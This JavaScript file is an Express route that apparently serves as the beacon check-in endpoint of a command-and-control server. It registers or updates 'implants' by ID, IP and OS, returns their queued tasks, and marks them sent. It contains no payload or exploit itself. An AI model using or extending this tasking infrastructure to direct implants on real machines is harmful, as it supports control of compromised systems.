const express = require("express");
const router = express.Router();
const statusCodes = require("../config/statusCodes");
const logger = require("../utils/logger");
const { validateBeacon } = require("../validation/request-validation");
const {
  findImplantById,
  addImplant,
  updateImplant,
} = require("../db/services/implant-service");
const {
  getTasksForImplant,
  taskSent,
} = require("../db/services/tasks-service");

router.post("", async (req, res) => {
  logger.log(
    "/beacon",
    `Received beacon: ${JSON.stringify(req.body)}`,
    logger.levels.DEBUG
  );
  let returnStatus = statusCodes.OK;
  let responseJSON = {}; // TODO make the response DTOs into their own classes

  try {
    const validationResult = validateBeacon(req.body);
    if (validationResult.isValid) {
      const beacon = {
        id: req.body.id,
        ip: req.body.ip,
        os: req.body.os,
        beaconIntervalSeconds: req.body.beaconIntervalSeconds,
        lastCheckinTimeSeconds: Date.now(),
      };

      if ((await findImplantById(beacon.id)) === null) {
        await addImplant(beacon);
      } else {
        await updateImplant(beacon);
      }

      const tasks = await getTasksForImplant(beacon.id, false);
      responseJSON = {
        tasks,
        errors: [],
      };

      await tasks.forEach(async (task) => {
        await taskSent(task._id);
      });
    } else {
      responseJSON = {
        tasks: [],
        errors: validationResult.errors,
      };
      console.log(JSON.stringify(responseJSON));
      returnStatus = statusCodes.BAD_REQUEST;
    }
  } catch (err) {
    returnStatus = statusCodes.INTERNAL_SERVER_ERROR;
    responseJSON = {
      tasks: [],
      errors: ["Internal Server Error"],
    };
    logger.log("/beacon", err, logger.levels.ERROR);
  }
  return res.status(returnStatus).json(responseJSON);
});

module.exports = router;
